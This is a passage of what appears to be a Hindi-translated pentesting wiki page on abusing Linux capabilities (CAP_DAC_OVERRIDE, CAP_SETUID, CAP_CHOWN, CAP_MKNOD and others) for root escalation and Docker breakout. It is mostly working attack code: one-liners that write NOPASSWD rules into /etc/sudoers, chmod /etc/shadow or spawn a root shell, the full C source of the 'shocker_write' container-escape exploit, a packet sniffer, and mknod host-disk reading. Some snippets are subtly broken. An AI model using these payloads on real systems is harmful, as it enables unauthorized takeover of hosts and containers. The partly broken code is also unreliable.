बहुत सारी फ़ाइलें हैं जिन पर आप **अधिकारों को उन्नत करने के लिए ओवरराइट कर सकते हैं,** [**यहां से आप विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस उदाहरण में vim के पास इस क्षमता है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी फ़ाइल को संशोधित कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**दूसरा उदाहरण बाइनरी के साथ**

इस उदाहरण में **`python`** बाइनरी को यह क्षमता होगी। आप पायथन का उपयोग करके किसी भी फ़ाइल को ओवरराइड कर सकते हैं:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**उदाहरण वातावरण के साथ + CAP_DAC_READ_SEARCH (Docker ब्रेकआउट)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
सबसे पहले, होस्ट की [**DAC\_READ\_SEARCH क्षमता का दुरुपयोग करके अनियमित फ़ाइलों को पढ़ने**](linux-capabilities.md#cap\_dac\_read\_search) के पिछले खंड को पढ़ें और एक्सप्लॉइट को **कंपाइल** करें।
फिर, निम्नलिखित शॉकर एक्सप्लॉइट का निम्नलिखित संस्करण **कंपाइल करें**, जो आपको होस्ट की फ़ाइल सिस्टम में **अनियमित फ़ाइलें लिखने** की अनुमति देगा:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
डॉकर कंटेनर से बाहर निकलने के लिए आप होस्ट से फ़ाइल `/etc/shadow` और `/etc/passwd` को **डाउनलोड** कर सकते हैं, उन्हें में एक **नया उपयोगकर्ता** जोड़ सकते हैं, और उन्हें **`shocker_write`** का उपयोग करके अधिलेखित कर सकते हैं। फिर, **ssh** के माध्यम से **पहुंच** सकते हैं।

**इस तकनीक का कोड "Abusing DAC\_OVERRIDE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**इसका मतलब है कि किसी भी फ़ाइल के स्वामित्व को बदला जा सकता है।**

**बाइनरी के साथ उदाहरण**

मान लें कि **`python`** बाइनरी में यह क्षमता है, आप **shadow** फ़ाइल के **स्वामी** को **बदल** सकते हैं, **रूट पासवर्ड बदल** सकते हैं, और विशेषाधिकारों को उन्नत कर सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या इस क्षमता के साथ **`ruby`** बाइनरी:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**इसका मतलब है कि किसी भी फ़ाइल की अनुमति को बदलना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन के पास यह क्षमता है तो आप शैडो फ़ाइल की अनुमतियों को संशोधित कर सकते हैं, **रूट पासवर्ड बदल सकते हैं**, और विशेषाधिकारों को बढ़ा सकते हैं:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**इसका मतलब है कि नए प्रक्रिया के प्रभावी उपयोगकर्ता आईडी को सेट करना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन के पास यह **क्षमता** है, तो आप आसानी से इसका दुरुपयोग करके विशेषाधिकारों को रूट तक उन्नयन कर सकते हैं:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**इसका मतलब है कि नए प्रक्रिया के प्रभावी समूह आईडी को सेट करना संभव है।**

यहां बहुत सारी फ़ाइलें हैं जिन्हें आप **उच्चतम अधिकार प्राप्त करने के लिए अधिलेखित कर सकते हैं,** [**आप यहां से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**बाइनरी के साथ उदाहरण**

इस मामले में, आपको देखना चाहिए कि कौन सी दिलचस्प फ़ाइलें हैं जिन्हें एक समूह पढ़ सकता है क्योंकि आप किसी भी समूह की अनुकरण कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
एक बार जब आप एक फ़ाइल को खोज लेते हैं जिसे आप उच्चाधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं (पढ़ने या लिखने के माध्यम से), तो आप **दिलचस्प समूह की अनुकरण करते हुए एक शेल प्राप्त कर सकते हैं**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
इस मामले में समूह shadow की अनुकरण की गई थी, इसलिए आप `/etc/shadow` फ़ाइल को पढ़ सकते हैं:
```bash
cat /etc/shadow
```
यदि **docker** स्थापित है तो आप **docker समूह** का **अनुकरण** कर सकते हैं और इसका दुरुपयोग करके [**docker सॉकेट** के साथ संवाद करके विशेषाधिकारों को बढ़ा सकते हैं](./#writable-docker-socket).

## CAP\_SETFCAP

**इसका मतलब है कि फ़ाइलों और प्रक्रियाओं पर क्षमताएँ सेट करना संभव है**

**बाइनरी के साथ उदाहरण**

यदि python में यह **क्षमता** है, तो आप आसानी से इसका दुरुपयोग करके विशेषाधिकारों को रूट तक बढ़ा सकते हैं:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
ध्यान दें कि यदि आप CAP\_SETFCAP के साथ बाइनरी में एक नई क्षमता सेट करते हैं, तो आप इस क्षमता को खो देंगे।
{% endhint %}

जब आपके पास [SETUID क्षमता](linux-capabilities.md#cap\_setuid) होती है, तो आप अधिकारों को बढ़ाने के लिए इसके खंड में जा सकते हैं।

**उदाहरण वातावरण के साथ (Docker breakout)**

डॉकर कंटेनर के अंदर के प्रोसेस को डिफ़ॉल्ट रूप से क्षमता **CAP\_SETFCAP दी जाती है**। आप ऐसा कुछ करके जांच सकते हैं:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
यह क्षमता बाइनरी को **किसी अन्य क्षमता को देने की अनुमति देती है**, इसलिए हम **इस पेज में उल्लिखित किसी भी अन्य क्षमता ब्रेकआउट का दुरुपयोग करके कंटेनर से बाहर निकलने** के बारे में सोच सकते हैं।\
हालांकि, यदि आप gdb बाइनरी को CAP\_SYS\_ADMIN और CAP\_SYS\_PTRACE क्षमताओं को देने का प्रयास करें, तो आप देने में सक्षम होंगे, लेकिन इसके बाद बाइनरी **वास्तविकता में कार्यान्वित नहीं होगा**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
जांच करने के बाद मैंने यह पढ़ा है: _Permitted: यह एक **प्रभावी क्षमताओं के लिए सीमित सुपरसेट है** जिन्हें थ्रेड अस्मिता कर सकता है। यह एक ऐसी सीमित सुपरसेट भी है जिसके लिए एक थ्रेड द्वारा वार्तालापित सेट में **CAP\_SETPCAP** क्षमता नहीं होती है।_\
ऐसा लगता है कि Permitted क्षमताएं उन्हें सीमित करती हैं जो उपयोग किए जा सकते हैं।\
हालांकि, डॉकर भी डिफ़ॉल्ट रूप से **CAP\_SETPCAP** प्रदान करता है, इसलिए आप **विरासत में नई क्षमताएं सेट कर सकते हैं**।\
हालांकि, इस कैप की दस्तावेज़ीकरण में यह लिखा है: _CAP\_SETPCAP: \[...\] **वार्तालाप करने वाले थ्रेड के बाउंडिंग सेट से कोई भी क्षमता उसकी विरासत में जोड़ सकती है**_।\
ऐसा लगता है कि हम केवल विरासत में बाउंडिंग सेट से क्षमताओं को जोड़ सकते हैं। जिसका मतलब है कि **हम विरासत में नई क्षमताएं जैसे CAP\_SYS\_ADMIN या CAP\_SYS\_PTRACE को नहीं रख सकते हैं ताकि विशेषाधिकार बढ़ाएं**।

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `/dev/mem`, `/dev/kmem` या `/proc/kcore` तक पहुंच, `mmap_min_addr` को संशोधित करें, `ioperm(2)` और `iopl(2)` सिस्टम कॉल का उपयोग करें, और विभिन्न डिस्क कमांड। इस क्षमता के माध्यम से `FIBMAP ioctl(2)` भी सक्षम होता है, जिसने [पिछले](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) में समस्याएं पैदा की हैं। मैन पेज के अनुसार, इसके धारक को अन्य उपकरणों पर विशेष रूप से `विभिन्न उपकरण-विशिष्ट आपरेशन करने` की अनुमति भी होती है।

यह **विशेषाधिकार बढ़ाने** और **Docker ब्रेकआउट** के लिए उपयोगी हो सकता है।

## CAP\_KILL

**इसका मतलब है कि किसी भी प्रक्रिया को मारना संभव है।**

**बाइनरी के साथ उदाहरण**

चलो मान लेते हैं कि **`python`** बाइनरी में यह क्षमता है। यदि आप किसी सेवा या सॉकेट कॉन्फ़िगरेशन (या किसी सेवा से संबंधित किसी भी कॉन्फ़िगरेशन फ़ाइल) फ़ाइल को **संशोधित कर सकते हैं**, तो आप उसे बैकडोर कर सकते हैं, और फिर उस सेवा से संबंधित प्रक्रिया को मार सकते हैं और आपके बैकडोर के साथ नई कॉन्फ़िगरेशन फ़ाइल को नया निष्पादित होने का इंतज़ार कर सकते हैं।
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**kill** के साथ Privesc

यदि आपके पास kill क्षमताएं हैं और एक **रूट के रूप में चल रहा है** (या एक अलग उपयोगकर्ता के रूप में) **नोड प्रोग्राम** है, तो आप शायद इसे **सिग्नल SIGUSR1** भेजकर इसे **नोड डीबगर खोलने** के लिए मजबूर कर सकते हैं, जहां आप कनेक्ट कर सकते हैं।
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) स्पेन में सबसे महत्वपूर्ण साइबर सुरक्षा कार्यक्रम है और यूरोप में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने की मिशन के साथ**, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उबलता हुआ मिलन स्थल है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**इसका मतलब है कि किसी भी पोर्ट पर सुनना संभव है (यहां तक कि विशेषाधिकृत पोर्ट पर भी)।** आप इस क्षमता के साथ सीधे विशेषाधिकारों को बढ़ा नहीं सकते।

**बाइनरी के साथ उदाहरण**

यदि **`python`** के पास इस क्षमता है तो यह किसी भी पोर्ट पर सुन सकेगा और इससे किसी अन्य पोर्ट पर भी कनेक्ट कर सकेगा (कुछ सेवाएं विशेषाधिकारों वाले पोर्ट से कनेक्शन की आवश्यकता होती है)।

{% tabs %}
{% tab title="सुनें" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="संपर्क करें" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को सक्षम करता है कि वह उपलब्ध नेटवर्क नेमस्पेस के लिए **RAW और PACKET सॉकेट प्रकार** बना सके। इससे उपयुक्त डेटा पैकेट उत्पन्न और प्रेषित किए जा सकते हैं। बहुत सारे मामलों में, यह इंटरफेस एक वर्चुअल ईथरनेट डिवाइस होगा जिससे एक खतरनाक या **संकटमय कंटेनर** विभिन्न नेटवर्क परतों में **पैकेट्स को छलका सकता है**। इस योग्यता वाली एक खतरनाक प्रक्रिया या संकटमय कंटेनर द्वारा उपस्थित ब्रिज में इंजेक्शन कर सकती है, कंटेनरों के बीच मार्गनिर्धारण का शोषण कर सकती है, नेटवर्क पहुंच नियंत्रणों को छलने कर सकती है, और अन्यथा होस्ट नेटवर्किंग के साथ खिलवाड़ कर सकती है यदि फ़ायरवॉल नहीं है जो पैकेट प्रकार और सामग्री को सीमित करने के लिए स्थापित नहीं है। अंत में, यह योग्यता प्रक्रिया को उपलब्ध नेमस्पेस के भीतर किसी भी पते से बाइंड करने की अनुमति देती है। यह योग्यता अधिकारी कंटेनरों द्वारा आमतौर पर रखी जाती है ताकि पिंग को कंटेनर से ICMP अनुरोध बनाने के लिए RAW सॉकेट का उपयोग करके कार्य कर सके।

**इसका मतलब है कि ट्रैफिक को स्निफ़ किया जा सकता है।** इस योग्यता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।

**बाइनरी के साथ उदाहरण**

यदि बाइनरी **`tcpdump`** इस योग्यता को रखता है तो आप इसका उपयोग नेटवर्क सूचना कैप्चर करने के लिए कर सकेंगे।
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
नोट करें कि यदि **पर्यावरण** इस क्षमता को प्रदान कर रहा है तो आप **`tcpdump`** का उपयोग करके ट्रैफिक स्निफ कर सकते हैं।

**द्विआधारी 2 के साथ उदाहरण**

निम्नलिखित उदाहरण **`python2`** कोड है जो "**lo**" (**localhost**) इंटरफेस के ट्रैफिक को अवरोधित करने के लिए उपयोगी हो सकता है। कोड [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) के लैब "_The Basics: CAP-NET\_BIND + NET\_RAW_" से है।
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) क्षमता धारक को अनावरणित नेटवर्क नेमस्पेस की फ़ायरवॉल, रूटिंग टेबल, सॉकेट अनुमतियों, नेटवर्क इंटरफ़ेस कॉन्फ़िगरेशन और अन्य संबंधित सेटिंग्स को संशोधित करने की अनुमति देती है। इसके अलावा, यह संबंधित नेटवर्क इंटरफ़ेस पर लगे नेटवर्क नेमस्पेस के बीच स्निफ़ करने की क्षमता प्रदान करती है।

**बाइनरी के साथ उदाहरण**

चलो मान लेते हैं कि **पायथन बाइनरी** के पास ये क्षमताएं हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**इसका मतलब है कि इनोड गुणों को संशोधित किया जा सकता है।** इस क्षमता के साथ आप सीधे विशेषाधिकारों को बढ़ा नहीं सकते।

**बाइनरी के साथ उदाहरण**

यदि आपको लगता है कि एक फ़ाइल immutable है और python के पास यह क्षमता है, तो आप **immutable गुण को हटा सकते हैं और फ़ाइल को संशोधन योग्य बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
ध्यान दें कि आमतौर पर यह अविचलनीय गुणवत्ता सेट और हटाने के लिए इस्तेमाल की जाती है:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) चूंकि `chroot(2)` सिस्टम कॉल का उपयोग करने की अनुमति देता है, इससे ज्ञात कमजोरियों और भागों का उपयोग करके किसी भी `chroot(2)` पर्यावरण से बाहर निकलने की अनुमति हो सकती है:

* [विभिन्न chroot समाधानों से बाहर निकलने का तरीका](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot भागने का उपकरण](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `reboot(2)` सिस्टम कॉल का उपयोग करने की अनुमति देता है। यह विशेष हार्डवेयर प्लेटफॉर्म के लिए `LINUX_REBOOT_CMD_RESTART2` के माध्यम से किसी भी **रीबूट कमांड** को निष्पादित करने की अनुमति देता है।

यह क्षमता यह भी संभव करती है कि `kexec_load(2)` सिस्टम कॉल का उपयोग किया जाए, जो एक नया क्रैश कर्नल लोड करता है और Linux 3.17 के रूप में, `kexec_file_load(2)` भी लोड करेगा जो साइन कर्नल लोड करेगा।

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) अंत में Linux 2.6.37 में `CAP_SYS_ADMIN` कैचॉल से फोर्क किया गया था, यह क्षमता प्रक्रिया को `syslog(2)` सिस्टम कॉल का उपयोग करने की अनुमति देती है। यह भी प्रक्रिया को `/proc/sys/kernel/kptr_restrict` 1 पर सेट होने पर `/proc` और अन्य इंटरफेस के माध्यम से विकसित कर्नल पतों को देखने की अनुमति देती है।

`kptr_restrict` सिस्कटल सेटिंग 2.6.38 में पेश किया गया था, और यह निर्धारित करता है कि कर्नल पते विकसित होते हैं या नहीं। यह 2.6.39 के बाद से डिफ़ॉल्ट रूप से शून्य (कर्नल पते विकसित करना) होता है, हालांकि कई वितरण सही मान सेट करते हैं 1 (सभी को छिपाएं केवल uid 0 को छोड़कर) या 2 (हमेशा छिपाएं)।

इसके अलावा, यह क्षमता भी प्रक्रिया को `dmesg` आउटपुट देखने की अनुमति देती है, यदि `dmesg_restrict` सेटिंग 1 होती है। अंत में, `CAP_SYS_ADMIN` क्षमता अभी भी ऐतिहासिक कारणों से `syslog` कार्यों को करने की अनुमति देती है।

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) का विस्तारित उपयोग करने की अनुमति देता है जिसके द्वारा नियमित फ़ाइल (`S_IFREG`), FIFO (नामित पाइप) (`S_IFIFO`), या UNIX डोमेन सॉकेट (`S_IFSOCK`) के अलावा कुछ और बनाने की अनुमति देता है। विशेष फ़ाइलें हैं:

* `S_IFCHR` (वर्ण स्पेशल फ़ाइल (टर्मिनल जैसी उपकरण))
* `S_IFBLK` (ब्लॉक स्पेशल फ़ाइल (डिस्क जैसी उपकरण))।

यह एक डिफ़ॉल्ट क्षमता है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।

इस क्षमता के तहत, निम्नलिखित शर्तों के तहत होस्ट पर प्रिविलेज इस्केलेशन (पूरे डिस्क पढ़ने के माध्यम से) किया जा सकता है:

1. होस्ट पर प्रारंभिक पहुंच होनी चाहिए (अनुप्रयोगी)।
2. कंटेनर पर प्रारंभिक पहुंच होनी चाहिए (विशेषाधिकारी (EUID 0), और प्रभावी `CAP_MKNOD`)।
3. होस्ट और कंटेनर को एक ही उपयोगकर्ता नेमस्पेस साझा करना चाहिए।

**चरण :**

1. होस्ट पर, एक मानक उपयोगकर्ता के रूप में:
1. वर्तमान UID प्राप्त करें (`id`)। उदाहरण के लिए: `uid=1000(unprivileged)`।
2. आप जिस डिवाइस को पढ़ना चाहते हैं, उसे प्राप्त करें। उदाहरण के लिए: `/dev/sda`
2. कंटेनर पर, `रूट` के रूप में:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. मेजबान पर वापस:
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
हमलावर अब अनधिकृत उपयोगकर्ता से उपकरण /dev/sda को पढ़, डंप और कॉपी कर सकते हैं।

### CAP\_SETPCAP

**`CAP_SETPCAP`** एक Linux क्षमता है जो एक प्रक्रिया को दूसरी प्रक्रिया की क्षमता सेट को संशोधित करने की अनुमति देती है। यह अन्य प्रक्रियाओं की प्रभावी, विरासत और अनुमत क्षमता सेट में क्षमताओं को जोड़ने या हटाने की क्षमता प्रदान करती है। हालांकि, इस क्षमता का उपयोग कैसे किया जा सकता है, इसमें कुछ प्रतिबंध हैं।

`CAP_SETPCAP` वाली प्रक्रिया **केवल उन्हीं क्षमताओं को प्रदान या हटा सकती है जो उसकी अनुमत क्षमता सेट में हैं**। अन्य शब्दों में, एक प्रक्रिया उस क्षमता को दूसरी प्रक्रिया को प्रदान नहीं कर सकती है जिसकी वह खुद की क्षमता नहीं है। यह प्रतिबंध एक प्रक्रिया को अपने स्वयं के विशेषाधिकार से बाहर दूसरी प्रक्रिया की प्रिविलेज को बढ़ाने से रोकता है।

इसके अलावा, हाल के कर्नल संस्करणों में, `CAP_SETPCAP` क्षमता को **और अधिक प्रतिबंधित किया गया है**। अब यह प्रक्रिया को अन्य प्रक्रियाओं की क्षमता सेट को अनियमित रूप से संशोधित करने की अनुमति नहीं देता है। इसकी बजाय, यह केवल एक प्रक्रिया को अपनी अनुमत क्षमता सेट या अपने वंशजों की अनुमत क्षमता सेट में क्षमताओं को कम करने की अनुमति देता है। इस परिवर्तन को क्षमता के साथ संबंधित संभावित सुरक्षा जोखिमों को कम करने के लिए लागू किया गया था।

